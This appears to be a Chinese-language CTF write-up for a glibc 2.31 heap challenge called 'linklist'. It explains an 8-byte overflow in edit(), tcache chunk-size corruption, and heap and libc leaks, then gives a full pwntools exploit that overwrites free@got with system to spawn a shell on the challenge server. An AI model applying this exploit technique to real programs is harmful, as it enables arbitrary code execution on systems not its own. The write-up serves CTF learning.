---
layout: post
title: "linklist"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "记录 2026 年 sh 比赛中 linklist 题目的分析与解题过程。"
source_folder: "Write-ups/2026/sh/linklist"
lang: zh-CN
---
{% raw %}
# 信息
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fc000)
	
	libc 2.31
```

# 思路

栈式堆管理题，manage chunk与content chunk都在一起。

漏洞在`edit()`函数不检测chunk的size，也不记录申请的size，导致不管申请多大都可以写0x20大小，而`add()`的限制不足，刚好可以申请一个0x18大小的chunk，可以溢出写0x8 bytes

由于从tcache malloc时不会对chunk的size做检查，所以可以通过溢出写修改tcache中的chunk的size，之后add，dele，再次add即可使用add函数进行更大范围的溢出写

由于edit只能操作linklist（.bss段链表头）指向的chunk，所以考虑用溢出写覆盖首个manage chunk中的content chunk的地址。

*这里其实可以实现tc poison，但tc会清空key值，用这个打got表会破坏其他函数导致crash*

到这里其实只实现了一次任意地址读写（堆风水好的话应该可以多构成几次），甚至没泄露任何信息，但由于2.31的libc，且no pie、Partial RELRO，直接打got表。

*注意，在对chunk的size有限制时，打got或hook时不要打malloc*

# exp

```
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/vuln"
host = "node5.buuoj.cn"
port = 25707
p = ELF(file)
libc = ELF("./libc-2.31.so")

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x, drop=False: io.recvuntil(x, drop=drop)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))


def look(expr):
    frame_globals = globals()
    value = eval(expr, frame_globals)
    print(f"\033[1;94m{expr} -> {hex(value)}\033[0m")
    return value


def cmd(idx):
    sla(b"choice?", str(idx).encode())


def add(size, con):
    cmd(1)
    sla(b"size?", str(size).encode())
    sa(b"content?", con)


def dele():
    cmd(2)


def show():
    cmd(3)


def edit(con):
    cmd(4)
    sa(b"content?", con)


add(0x18, b"a")
add(0x20, b"a")
add(0x20, b"a")
add(0x20, b"a")

dele()
dele()
dele()

edit(b"a" * 0x18 + p64(0x91))


add(0x20, b"a")
show()
ru(b"content: ")
heap = (uu64(rn(4)) >> 3 * 4) << 4 * 3
sh = heap + 0x2C0
look("heap")
dele()

add(0x80, b"x" * 0x50 + p64(p.got["free"]))
show()
ru(b"content: ")
libc.address = uu64(rn(6)) - libc.sym["free"]
look("libc.address")

edit(p64(libc.sym["system"]))
add(0x60, b"sh\x00")
dele()

dbg()

io.interactive()
```


{% endraw %}
